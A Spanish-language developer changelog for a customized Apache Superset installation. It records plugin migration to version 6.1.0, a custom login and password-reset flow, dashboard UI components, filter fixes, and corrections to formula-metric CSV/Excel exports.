### 2026-06-03 (actualización 18)

Migración de "Custom Login Page Configuration (Irex)" de superset_v6 a superset_v6_1_0.
Incluye login personalizado con Jinja, recuperación de contraseñas y paso 11 en migrate-plugins.sh.

Archivos afectados:
- `superset_v6_1_0/superset/config.py`: añadido bloque Custom Login (CustomAuthDBView, CustomSecurityManager, CUSTOM_SECURITY_MANAGER)
- `superset_v6_1_0/superset/security/password_reset.py`: copiado desde v6 (PasswordResetView + PasswordResetSecurityManager)
- `superset_v6_1_0/superset/templates/appbuilder/custom_login.html`: plantilla de login personalizado
- `superset_v6_1_0/superset/templates/appbuilder/novedades.html`: modal de novedades incluido en custom_login.html
- `superset_v6_1_0/superset/templates/appbuilder/password/request.html`: formulario de solicitud de recuperación
- `superset_v6_1_0/superset/templates/appbuilder/password/reset.html`: formulario de nueva contraseña
- `superset_v6_1_0/superset/templates/appbuilder/password/email_reset.html`: plantilla HTML del correo de recuperación
- `superset_v6_1_0/superset/static/customcss/custom_login.css`: estilos del login personalizado
- `superset_v6_1_0/superset/static/customcss/password_flow.css`: estilos del flujo de recuperación de contraseña
- `superset_v6_1_0/superset/static/js_personal/custom_login.js`: JS del login (modal demo, novedades, toggle password)
- `superset_v6_1_0/superset/static/js_personal/password_reset.js`: JS del flujo de recuperación
- `custom-src/login/`: fuente canónica de todos los archivos del login (nueva carpeta)
- `superset_v6_1_0/superset/static/assets/images/irex_ss.gif`: logo animado del panel izquierdo
- `superset_v6_1_0/superset/static/assets/images/business_presentation.json`: animación Lottie del panel izquierdo
- `superset_v6_1_0/superset/static/assets/images/novedades/favoritos.gif` + `tema_oscuro.gif`: GIFs del modal de novedades
- `superset_v6_1_0/superset/static/video_superset/Presentacion Superset.mp4` + `subtitulos.vtt`: video demo
- `custom-src/login/static/`: fuente canónica de todos los assets (excepto el .mp4 de 90MB)
- `migrate-plugins.sh`: añadido paso 11 (11a–11d) para automatizar la migración del login en futuras versiones

Qué cambia y por qué:
- El login estándar de Superset 6 usa una SPA React en /login/. Se reemplaza con una vista
  Jinja servidor-lado (CustomAuthDBView) que renderiza custom_login.html con diseño Irex.
- Se añade flujo completo de recuperación de contraseña (PasswordResetView en /password/solicitar/
  y /password/restablecer/<token>/) con envío de correo SMTP firmado con itsdangerous.
- El script migrate-plugins.sh copia desde custom-src/login/ y parchea config.py automáticamente,
  de modo que migraciones a versiones futuras de Superset solo requieren correr el script.

### 2026-05-29 (actualización 17)

Documentacion del plugin html-cards actualizada (INSTRUCCIONES_PLUGIN_HTML_CARDS.md):
- Corrección de version (v6 → v6.1.0)
- Requisito previo HTML_SANITIZATION = False documentado
- Transformacion snakeCase de templateKey documentada con tabla de ejemplos
- Nueva sección de acceso por índice con data.[N] (reemplaza lookup rows N que falla)
- firstRow documentado como alternativa confiable a firstDisplayRow
- Tabla de variables raíz con descripción y guía de uso
- Sección "Problemas conocidos en v6.1.0" con workarounds

Nota de soporte: el error "Missing helper: numberFormatD3" se debe a usar el tipo de chart
incorrecto (plugin-chart-handlebars en lugar de html_cards). El plugin-chart-handlebars nativo
de Superset no tiene los helpers custom del html-cards (numberFormatD3, timeFormatD3, etc.).
Asegurarse de que el chart tenga viz_type = html_cards.

### 2026-05-29 (actualización 16)

Fix imports en `HandlebarsViewer.tsx` del plugin `plugin-chart-html-cards`.

Archivos afectados:
- `custom-plugins/plugin-chart-html-cards/src/components/Handlebars/HandlebarsViewer.tsx`

Qué cambia y por qué:
- `styled` y `t` se importaban desde `@superset-ui/core`. En v6.1.0, eso causa una
  dependencia circular (el step 3b agrega re-exports de `@apache-superset/core/*` en
  `@superset-ui/core`), haciendo que `styled` sea `undefined` al inicializar el módulo.
  Al fallar la definición de los styled-components, el módulo aborta antes de ejecutar
  los `Handlebars.registerHelper(...)`, dando "Missing helper: numberFormatD3" en runtime.
- Fix: importar `styled` desde `@apache-superset/core/theme` y `t` desde
  `@apache-superset/core/translation`, igual que el resto de plugins en v6.1.0.
- Requiere `npm run build` en `superset_v6_1_0/superset-frontend`.

### 2026-05-29 (actualización 15)

Aplicación del fix de 2026-05-14 a `superset_v6_1_0` (bug: filtro con `Select first filter value by default` no se podía dejar vacío).

Archivos afectados en `superset_v6_1_0/`:
- `superset-frontend/src/filters/components/Select/SelectFilterPlugin.tsx`:
  - Agregado `const isChangedByUser = useRef(false)` (ref faltante)
  - Agregado `isChangedByUser.current = true` en `handleChange` (marca cambio explícito del usuario)
  - Agregado `isChangedByUser.current = false` en el efecto de cambio de datos upstream
  - Agregado early return `if (isChangedByUser.current) return` en el useEffect de resync
  - Cambiado `filterState.value !== undefined` → `filterState.value != null` en la condición de resync
- `superset-frontend/src/dashboard/components/nativeFilters/FilterBar/index.tsx`:
  - Reemplazada la condición `if (appliedChanged || notInitialized)` por lógica que distingue
    filtros no inicializados (siempre actualizar) de filtros con cambio aplicado: solo actualiza
    si `isEqual(selectedValue, prevValue)` (el usuario no modificó el filtro manualmente).

Nota: este fix no se agrega a `migrate-plugins.sh` ya que puede ser corregido por Superset en versiones futuras.

### 2026-05-29 (actualización 14)

Migración de personalización de pantalla de dashboards (v6 → v6_1_0).

Archivos canónicos agregados a `custom-src/`:
- `custom-src/FavoritesBanner/FavoritesBanner.tsx` — barra horizontal de favoritos con scroll
  lateral, que aparece sobre la lista de dashboards. Muestra los dashboards marcados como
  favoritos por el usuario con tarjetas compactas.
- `custom-src/DashboardTagSidebar/DashboardTagSidebar.tsx` — barra lateral izquierda con
  filtro de dashboards por categoría (tags de tipo "custom"). En desktop se muestra por
  defecto; en móvil es un drawer colapsable.
- `custom-src/patch_dashboard_list.py` — script Python que parchea
  `src/pages/DashboardList/index.tsx` para integrar los dos componentes anteriores.

- `custom-src/ListViewCard/index.tsx` — tarjetas en layout horizontal (thumbnail
  cuadrado 120×120 a la izquierda, body con título/descripción/acciones a la derecha).

Archivos resultantes en `superset_v6_1_0/`:
- `superset-frontend/src/features/dashboards/FavoritesBanner.tsx` ← symlink a custom-src
- `superset-frontend/src/features/dashboards/DashboardTagSidebar.tsx` ← symlink a custom-src
- `superset-frontend/packages/superset-ui-core/src/components/ListViewCard/index.tsx` ← symlink a custom-src (layout horizontal, thumbnail cuadrado izquierda)
- `superset-frontend/src/pages/DashboardList/index.tsx` — parcheado con 5 cambios:
    A. Imports de useHistory, useLocation, FavoritesBanner, DashboardTagSidebar
    B. Styled components PageLayout, ListArea, ToggleSidebarButton
    C. Estado showTagSidebar + callbacks getCurrentTagId y handleTagSelect
    D. Variable subMenuName con botón de toggle de sidebar
    E. Render: envuelve ListView con PageLayout/ListArea, agrega DashboardTagSidebar arriba
       y FavoritesBanner sobre la lista
- `superset-frontend/src/components/ListView/CardCollection.tsx` — grid cambiado de
  `repeat(auto-fit, 300px)` a `repeat(auto-fill, minmax(340px, 1fr))` con breakpoints
  responsive (≤1800px→300px, ≤1400px→280px, ≤1200px→240px): da 5 tarjetas/fila en
  pantallas típicas de escritorio en lugar de 6.

`migrate-plugins.sh` actualizado con paso 10 (10a, 10b, 10c).
`PLUGINS.md` actualizado con las nuevas reglas de workflow para estos componentes.

### 2026-05-28 (actualización 13)

Cambio realizado:
Fix de 2 bugs en el export CSV/Excel de Formula metrics del pivot_table_rx1.

Bug 1 — Sort rows by no se respetaba en el CSV/Excel:
  pivot_df (que usa pd.DataFrame.pivot_table) ordena el índice alfabéticamente,
  destruyendo el orden definido por "Sort rows by". Fix: antes de llamar a pivot_df
  se captura el orden original de los valores únicos del índice de fila tal como
  viene del DB, y después del pivot se restaura ese orden con df.loc[reindex].

Bug 2 — Fórmula con dependencia de otra oculta salía vacía:
  _get_pivot_rx1_export_formulas filtraba las fórmulas ocultas (hidden=True), pero
  otras fórmulas podían depender de ellas (ej: 80_20 usa {{peso}} y peso estaba oculta).
  Fix: ahora se computan TODAS las fórmulas (visibles + ocultas) en _apply_pivot_rx1_formulas.
  Las ocultas se agregan a excluded_columns → se eliminan del CSV antes de devolver el resultado.
  En pivot_table_rx1 solo se incluyen las visibles como métricas del pivot.

Archivos afectados:
- `superset_v6_1_0/superset/charts/client_processing.py` — pivot_table_rx1 con restauración de orden
- `superset_v6_1_0/superset/common/query_context_processor.py` — _get_pivot_rx1_export_formulas
  ahora devuelve todas las fórmulas + lista de etiquetas a excluir (ocultas + jinja fields)

### 2026-05-28 (actualización 12)

Cambio realizado:
Fix definitivo del export CSV/Excel de Formula metrics en pivot_table_rx1.

Causa raíz encontrada con logs: get_data sí añadía las columnas de fórmulas al DataFrame
y las serializaba en el CSV. Pero apply_client_processing (para result_type=post_processed)
re-leía ese CSV como DataFrame y lo re-pivoteaba con pivot_table_v2, que solo pivotea las
métricas de form_data["metrics"] — ignorando completamente las columnas de fórmulas.

Archivos afectados:
- `superset_v6_1_0/superset/charts/client_processing.py`
  — Nueva función pivot_table_rx1(): idéntica a pivot_table_v2() pero agrega las formula
    metrics visibles (metricFormulas no hidden que existan como columna en el df) a la
    lista de métricas antes de llamar a pivot_df().
  — post_processors: "pivot_table_rx1" ahora apunta a pivot_table_rx1 (antes a pivot_table_v2)

- `superset_v6_1_0/superset/common/query_context_processor.py`
  — _irex_log, _evaluate_pivot_formula_for_row, _apply_pivot_rx1_formulas,
    _get_pivot_rx1_export_formulas: métodos de soporte (algunos temporales de debug)

Script migrate-plugins.sh actualizado: paso 8c reescrito con el post-processor correcto.

### 2026-05-28 (actualización 11)

Cambio realizado:
Segunda iteración del fix de exports CSV/Excel para Formula metrics del pivot-tableRx1.
En lugar de depender de extras.calculated_columns_export (cadena de serialización compleja
y propensa a fallos), ahora el backend lee metricFormulas y jinja_fields directamente
desde form_data, que siempre está disponible en el QueryContext.

Archivo afectado:
- `superset_v6_1_0/superset/common/query_context_processor.py`
  — `_SCOPED_REF_RE`: regex de clase para detectar referencias con scope
  — `_get_pivot_rx1_export_formulas()`: nuevo método que lee form_data.metricFormulas,
    filtra ocultas y fórmulas con scope, y también devuelve los jinja fields a excluir
  — `get_data`: usa _get_pivot_rx1_export_formulas() en lugar de extras para pivot_table_rx1

### 2026-05-28 (actualización 10)

Cambio realizado:
Fix del bug que impedía ver las fórmulas de Formula metrics en los exports CSV/Excel.

Causa raíz: en `get_data` de `query_context_processor.py`, el `verbose_map` (que renombra
columnas de nombres internos de BD a nombres visibles como "Venta") se aplicaba AL FINAL,
DESPUÉS de computar las fórmulas. Las fórmulas como `{{Venta}}/{{Plan}}` buscaban la columna
"Venta" en el dataframe, pero en ese punto aún se llamaba "sum__ventas" (nombre interno),
por lo que no encontraban nada y devolvían null.

Archivo afectado:
- `superset_v6_1_0/superset/common/query_context_processor.py`
  — `get_data`: `verbose_map` ahora se aplica PRIMERO (renombra todas las columnas a sus
    nombres visibles), y LUEGO se computan las fórmulas, se excluyen columnas y se aplican
    los `column_display_names`. De esta forma `{{Venta}}` siempre encuentra la columna
    correcta independientemente del nombre interno usado por la BD.

### 2026-05-28 (actualización 9)

Cambio realizado:
Fix de exports CSV/Excel en plugin pivot-tableRx1: las formula metrics visibles (no auxiliares)
ahora se incluyen en el export. Los Jinja fields se excluyen del export automáticamente.

Archivo afectado:
- `custom-plugins/plugin-chart-pivot-tableRx1/src/plugin/buildQuery.ts`
  — exportableFormulas: formula metrics visibles y sin referencias con scope (total./row./col./
    previous./next.) se envían como extras.calculated_columns_export al backend.
    El backend ya tiene el evaluador (_evaluate_export_formula) que las computa sobre
    los datos planos antes de serializar a CSV/Excel.
  — jinjaFieldLabels: los Jinja fields se envían como extras.excluded_columns para que
    no aparezcan en el export (son métricas auxiliares de la BD).

Notas técnicas:
- Las fórmulas con referencias de scope (total.{{X}}, row.{{X}}, etc.) NO se incluyen en
  el export porque dependen de la estructura pivoteada que no existe en los datos planos.
  Se excluyen con SCOPED_REF_PATTERN antes de enviarlas al backend.
- El mecanismo calculated_columns_export ya existía en query_context_processor.py (agregado
  para el plugin tableV3), se reutiliza aquí sin cambios de backend.

### 2026-05-28 (actualización 8)

Cambio realizado:
Nueva funcionalidad "Auxiliar (no mostrar en tabla)" en Formula metrics (Jinja-like) del
plugin pivot-tableRx1. Permite usar una fórmula como variable intermedia en otras fórmulas
sin que aparezca como columna en la tabla ni en exports CSV/Excel.
También corregido el problema de symlinks con webpack (resolve.symlinks: false).

Archivos afectados:
- `custom-plugins/plugin-chart-pivot-tableRx1/src/types.ts`
  — hidden?: boolean agregado a FormulaMetric
- `custom-plugins/plugin-chart-pivot-tableRx1/src/plugin/controlPanel.tsx`
  — hidden en MetricFormulaItem, normalizeMetricFormulasValue preserva hidden,
    buildMetricOrderOptions filtra métricas ocultas (no aparecen en Metric order)
- `custom-plugins/plugin-chart-pivot-tableRx1/src/plugin/transformProps.ts`
  — parseFormulaMetrics preserva el campo hidden
- `custom-plugins/plugin-chart-pivot-tableRx1/src/PivotTableChart.tsx`
  — normalizedFormulaMetrics preserva hidden
  — visibleFormulaMetricNames = solo las no ocultas
  — metricNames y unpivotedData usan visibleFormulaMetricNames (ocultas no se renderizan)
  — formulaMetricNames (todas, incluidas ocultas) sigue usándose para excluir de jinjaFields
- `custom-src/FormulaMetricControl/index.tsx`
  — hidden en props, state y defaultProps
  — Checkbox "Auxiliar (no mostrar en tabla)" en el popover
  — textSummary muestra "[aux]" como prefijo cuando hidden=true
  — onSave envía hidden al onChange
- `superset_v6_1_0/superset-frontend/webpack.config.js`
  — resolve.symlinks: false para que babel-loader y módulos npm se resuelvan
    correctamente con plugins/controles en directorios symlinkeados

Scripts/docs actualizados:
- `migrate-plugins.sh` — paso 1b: parchea webpack.config.js
- `PLUGINS.md` — documenta resolve.symlinks: false

### 2026-05-28 (actualización 7)

Cambio realizado:
Documentación de previous.{{}} y next.{{}} en FormulaMetricControl del plugin pivot-tableRx1.
También corregido un bug de path relativo en el symlink del control.

Archivos afectados:
- `custom-src/FormulaMetricControl/index.tsx`
  - Intellisense: agregados previous.{{Metric}} y next.{{Metric}} en getKeywords()
  - Tooltip del campo Formula: menciona previous y next como scopes disponibles
  - Ejemplos en el popover: agregado "{{Venta}} - previous.{{Venta}}" y línea "Scopes"
  - Modal de ayuda: sección Scopes con previous y next documentados con ejemplos
  - Fix: import de ControlPopover cambiado de relativo '../...' a absoluto
    'src/explore/components/controls/ControlPopover/ControlPopover' para que funcione
    correctamente cuando el archivo se carga desde el symlink en custom-src/.

### 2026-05-28 (actualización 6)

Cambio realizado:
Reestructuración de la arquitectura de plugins para evitar duplicación de lógica.
Conversión de copias a symlinks para plugins y controles custom.
Reescritura completa del script de migración con todos los pasos acumulados.
Creación de PLUGINS.md con instrucciones para herramientas IA.

Cambios estructurales:
- Los directorios plugin-chart-tableV3, plugin-chart-pivot-tableRx1, plugin-chart-html-cards
  dentro de superset_v6_1_0/superset-frontend/plugins/ ahora son SYMLINKS a custom-plugins/.
- FormulaMetricControl y MetricOrderControl dentro de
  superset_v6_1_0/superset-frontend/src/explore/components/controls/ son SYMLINKS a custom-src/.
- ColumnConfigControl sigue siendo una copia (5 archivos individuales dentro de un directorio
  de Superset, no se puede symlink completo).

Archivos creados/modificados:
- `migrate-plugins.sh` — reescrito completo con 9 pasos (incluye HTML_SANITIZATION y symlinks)
- `PLUGINS.md` — guía de arquitectura y workflow para herramientas IA
- `CLAUDE.md` — referencia a PLUGINS.md
- `AGENTS.md` — referencia a PLUGINS.md

### 2026-05-28 (actualización 5)

Cambio realizado:
Fix del error React #130 en plugin-chart-pivot-tableRx1. Los controles FormulaMetricControl y
MetricOrderControl no existían en v6.1.0, causando que el componente se resolviera como `undefined`.

Archivos creados en superset_v6_1_0:
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/FormulaMetricControl/index.tsx`
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/MetricOrderControl/index.tsx`

Archivos modificados en superset_v6_1_0:
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/index.ts` — imports y exports
  de FormulaMetricControl y MetricOrderControl agregados al mapa de controles.

Archivos creados en custom-src/:
- `custom-src/FormulaMetricControl/index.tsx`
- `custom-src/MetricOrderControl/index.tsx`

Script migrate-plugins.sh actualizado: paso 6b.

### 2026-05-28 (actualización 4)

Cambio realizado:
Fix de pivot-tableRx1 en v6.1.0: Jinja fields, Formula metrics y Metric order no funcionaban porque
el backend no reconocía el viz_type "pivot_table_rx1" en dos lugares críticos.

Archivos afectados en superset_v6_1_0:
- `superset_v6_1_0/superset/charts/client_processing.py` — agregado "pivot_table_rx1": pivot_table_v2
  al dict post_processors. Sin esto el servidor no aplicaba la operación de pivoteo y devolvía
  datos planos en vez de la estructura de tabla pivoteada que el frontend espera.
- `superset_v6_1_0/superset/common/query_context_factory.py` — extendido el check de viz_type
  para incluir "pivot_table_rx1" junto a "pivot_table_v2" en la inyección de currency_code_column.

Nota: Jinja fields, formula metrics y metric order son procesamiento 100% frontend
(transformProps.ts + PivotTableChart.tsx). El único backend necesario es el pivoteo del dataframe,
que ahora sí se aplica al Rx1.

Script migrate-plugins.sh actualizado: pasos 7c y 7d en la sección de backend Python.

### 2026-05-28 (actualización 3)

Cambio realizado:
Fix del error "Unknown field" en v6.1.0 para los campos Jinja (column_display_names, excluded_columns,
calculated_columns_export, column_export_order) del plugin TableV3. El backend de v6.1.0 no conocía
estos campos en la validación Marshmallow ni tenía la lógica de procesamiento para exports.

Archivos afectados en superset_v6_1_0:
- `superset_v6_1_0/superset/charts/schemas.py` — 4 campos nuevos agregados a ChartDataExtrasSchema
- `superset_v6_1_0/superset/common/query_context_processor.py` — imports ast/numpy, 3 helpers
  (_evaluate_export_formula, _apply_export_calculated_columns, _apply_export_column_order) y
  método get_data extendido con la lógica completa de procesamiento de columnas custom

Script migrate-plugins.sh actualizado: agrega paso 7 (parches de backend Python).

### 2026-05-28 (actualización 2)

Cambio realizado:
Corrección de imports rotos en v6.1.0: t, tn, addLocaleData, css, styled, useTheme, GenericDataType se movieron
de @superset-ui/core a @apache-superset/core en v6.1.0. Se agregaron re-exports en @superset-ui/core/index.ts
para mantener compatibilidad sin tocar los plugins. También se restauró el "Customize columns" del TableV3
(Display name + pestaña HTML con htmlTemplate y htmlCss) copiando 5 archivos de ColumnConfigControl desde v6.

Archivos afectados en superset_v6_1_0:
- `superset_v6_1_0/superset-frontend/packages/superset-ui-core/src/index.ts` — re-exports de compatibilidad
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/ColumnConfigControl/constants.tsx` — Display name + HTML tab + HTML_TEMPLATE_EXAMPLES + HTML_TEMPLATE_AI_PROMPT
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/ColumnConfigControl/ColumnConfigPopover.tsx` — HtmlTemplateHelpPanel
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/ColumnConfigControl/types.ts` — tipos SharedColumnConfigProp actualizados
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/ColumnConfigControl/ControlForm/controls.ts` — TextAreaControl agregado
- `superset_v6_1_0/superset-frontend/src/explore/components/controls/ColumnConfigControl/ControlForm/index.tsx` — imports

Archivos creados en el proyecto raíz:
- `custom-src/ColumnConfigControl/` — copia de los 5 archivos para uso del script de migración

Script migrate-plugins.sh actualizado: agrega paso 3b (re-exports) y paso 6 (ColumnConfigControl).

### 2026-05-28

Cambio realizado:
Migración de plugins personalizados irex (tableV3, pivot-tableRx1, html-cards) a superset_v6_1_0.
Creación de script reutilizable `migrate-plugins.sh` para automatizar migraciones futuras.

Archivos creados/afectados en superset_v6_1_0:
- `superset_v6_1_0/superset-frontend/plugins/plugin-chart-tableV3/` (copiado)
- `superset_v6_1_0/superset-frontend/plugins/plugin-chart-pivot-tableRx1/` (copiado)
- `superset_v6_1_0/superset-frontend/plugins/plugin-chart-html-cards/` (copiado)
- `superset_v6_1_0/superset-frontend/package.json` — agregadas 3 entradas file: para los plugins personalizados
- `superset_v6_1_0/superset-frontend/packages/superset-ui-core/src/chart/types/VizType.ts` — agregados HtmlCards, PivotTableRx1, TableV3 al enum
- `superset_v6_1_0/superset-frontend/src/setup/setupPluginsExtra.ts` — registro de los 3 plugins (reemplaza el patrón de modificar MainPreset.ts)
- `superset_v6_1_0/superset-frontend/src/explore/components/useExploreAdditionalActionsMenu/index.tsx` — agrega VizType.PivotTableRx1 a VIZ_TYPES_PIVOTABLE
- `superset_v6_1_0/superset-frontend/src/dashboard/components/SliceHeaderControls/index.tsx` — agrega VizType.PivotTableRx1 a isPivotTable
- `superset_v6_1_0/superset-frontend/src/features/reports/ReportModal/index.tsx` — agrega VizType.PivotTableRx1 a TEXT_BASED_VISUALIZATION_TYPES
- `superset_v6_1_0/superset-frontend/src/features/alerts/AlertReportModal.tsx` — agrega VizType.PivotTableRx1 a TEXT_BASED_VISUALIZATION_TYPES

Archivos creados en el proyecto raíz:
- `custom-plugins/` — directorio con los 3 plugins fuera del repo de Superset (fuente canónica para futuras migraciones)
- `migrate-plugins.sh` — script que automatiza todos los pasos anteriores para cualquier versión futura de Superset

Que cambia o corrige:
- Los plugins personalizados quedan disponibles en v6.1.0 sin modificar MainPreset.ts (se usa setupPluginsExtra.ts en su lugar).
- Para migrar a futuras versiones: copiar nuevo repo Superset y ejecutar `./migrate-plugins.sh /ruta/superset_vX_Y_Z`.

Pendiente:
- Ejecutar `npm install` en superset_v6_1_0/superset-frontend para instalar las dependencias nuevas.
- Verificar que los 3 plugins aparecen en el selector de visualizaciones tras el build.

### 2026-05-14

Cambio realizado:
Correccion del bug en filtros de dashboard con la opcion `Select first filter value by default` activa que impedía dejar el filtro vacío.

Archivos afectados:
- `superset_v6/superset-frontend/src/filters/components/Select/SelectFilterPlugin.tsx`
- `superset_v6/superset-frontend/src/dashboard/components/nativeFilters/FilterBar/index.tsx`

Que cambia o corrige:
- En `SelectFilterPlugin.tsx`: el segundo `useEffect` tenía una condición de salida anticipada defectuosa. La condición `isChangedByUser.current && filterState.value && ...` fallaba cuando el usuario borraba el filtro porque `filterState.value = null` (falsy), y el early-return nunca se disparaba. Se simplificó a `if (isChangedByUser.current) return;` para respetar cualquier cambio explícito del usuario, incluyendo borrar el campo.
- En `SelectFilterPlugin.tsx`: la condición principal del mismo `useEffect` usaba `filterState.value !== undefined`, que también pasa para `null`. Se corrigió a `filterState.value != null` para tratar tanto `null` (filtro borrado) como `undefined` (nunca asignado) como estado vacío y no re-seleccionar en esos casos.
- En `FilterBar/index.tsx`: el efecto `setDataMaskSelected(() => dataMaskApplied)` reemplazaba completamente todo el estado de filtros seleccionados cada vez que cambiaba `dataMaskApplied`. Los filtros con `defaultToFirstItem: true` tienen `requiredFirst: true`, lo que provoca un `dispatch` automático a Redux al inicializarse, cambiando `dataMaskApplied` y disparando el efecto que sobreescribía el filtro que el usuario acababa de borrar. Se reemplazó por un merge inteligente que solo actualiza un filtro cuando su valor seleccionado coincide con el valor aplicado previo, preservando los cambios pendientes del usuario.

Verificacion:
- Sin pruebas automatizadas específicas para este bug. Requiere verificacion manual en dashboard con filtro `Select first filter value by default` activo: abrir dashboard, confirmar que el primer valor se selecciona, borrar el filtro con la X, confirmar que queda vacío.

### 2026-05-08

Cambio realizado:
Restauracion de encabezados verticales fijos en Pivot Table Rx1.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/Styles.js`

Que cambia o corrige:
- Los encabezados superiores vuelven a quedar fijos siempre, como era el comportamiento original.
- La opcion `Sticky headers` queda limitada a fijar horizontalmente la primera columna/cuadrante.

Verificacion:
- `node -e "... @babel/parser ... Styles.js ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-05-08

Cambio realizado:
Correccion de desplazamiento del cuadrante de filas en Pivot Table Rx1 con `Sticky headers`.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/Styles.js`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`

Que cambia o corrige:
- El encabezado compacto de filas (`division / nombre_tc / nombre_tipo_gasto / responsable_cc`) ahora queda fijo horizontalmente al activar `Sticky headers`.
- Se agrega una clase sticky especifica para ese cuadrante superior izquierdo.

Verificacion:
- `node -e "... @babel/parser ... Styles.js TableRenderers.jsx ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-05-08

Cambio realizado:
Botones globales de expandir/colapsar y sticky opcional en Pivot Table Rx1.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/types.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/plugin/controlPanel.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/plugin/transformProps.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/PivotTableChart.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/Styles.js`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts`

Que cambia o corrige:
- Se agrega una toolbar minimalista con botones `+` y `-` cuando hay subtotales de filas o columnas.
- Los botones actualizan todos los grupos colapsables visibles de filas y columnas, respetando `Collapse rows by default`.
- Se agrega el control `Sticky headers`, apagado por defecto.
- Al activar `Sticky headers`, se fijan encabezados superiores, primera columna de encabezados de fila y etiqueta de total de columnas.
- Se marcan y fijan explicitamente los nombres de ejes de columnas (`Métrica`, `ano`, `mes_id`, etc.) para que no desaparezcan con scroll horizontal.
- Se agrega prueba para validar el valor por defecto y el encendido de `Sticky headers`.

Verificacion:
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-05-08

Cambio realizado:
Tooltip enriquecido para celdas de Pivot Table Rx1.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/types.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/plugin/controlPanel.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/plugin/transformProps.ts`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/PivotTableChart.tsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts`

Que cambia o corrige:
- Se agrega el control `Show enriched cell tooltip`.
- Las celdas de datos, totales de fila, totales de columna y gran total muestran tooltip con valor formateado, valor raw, contexto de filas/columnas y formula cuando aplica.
- El tooltip se puede desactivar desde el panel de configuracion.
- Se agrega prueba para validar el valor por defecto y el apagado del tooltip.

Verificacion:
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-05-07

Cambio realizado:
Resaltado de fila completa al pasar el mouse en Pivot Table Rx1.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/Styles.js`

Que cambia o corrige:
- Al hacer hover sobre una fila del cuerpo de la tabla, se resaltan todas sus celdas: encabezados de fila, subtotales y valores.
- Se excluye la fila final de totales para conservar su comportamiento visual fijo.

Verificacion:
- `node -e "... @babel/parser ... Styles.js ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-05-07

Cambio realizado:
Correccion de alineacion en `Compact row tree` de Pivot Table Rx1.

Archivos afectados:
- `superset_v6/superset-frontend/plugins/plugin-chart-pivot-tableRx1/src/react-pivottable/TableRenderers.jsx`

Que cambia o corrige:
- En vista compacta ya no se reserva la columna extra `Métrica` cuando existen columnas (`colAttrs`).
- Evita que los valores se corran una columna y que la ultima quede vacia.
- El header compacto y las filas de datos ahora cubren tambien la columna auxiliar del eje `Métrica`, manteniendo alineadas las metricas visibles.

Verificacion:
- `node -e "... @babel/parser ... TableRenderers.jsx ..."` parse OK.
- `git diff --check`
- `npm test -- --runTestsByPath plugins/plugin-chart-pivot-tableRx1/test/plugin/transformProps.test.ts plugins/plugin-chart-pivot-tableRx1/test/plugin/buildQuery.test.ts plugins/plugin-chart-pivot-tableRx1/test/index.test.ts`

### 2026-04-24

Cambio realizado:
Ajuste de la configuracion de runtime de `superset.service` para que las miniaturas se capturen cuando el dashboard termina de cargar.

Archivos afectados:
- `/home/imercados/.superset/superset_config.py`

Que cambia o corrige:
- Se cambia `SCREENSHOT_PLAYWRIGHT_WAIT_EVENT` de `domcontentloaded` a `networkidle`.
- Con Playwright, esto evita capturas demasiado tempranas que dejaban miniaturas vacias o incompletas en dashboards con carga lenta.
- Se deshabilita `SCREENSHOT_TILED_ENABLED` para evitar que charts extremadamente altos entren en captura por mosaico y agoten el soft time limit de Celery.
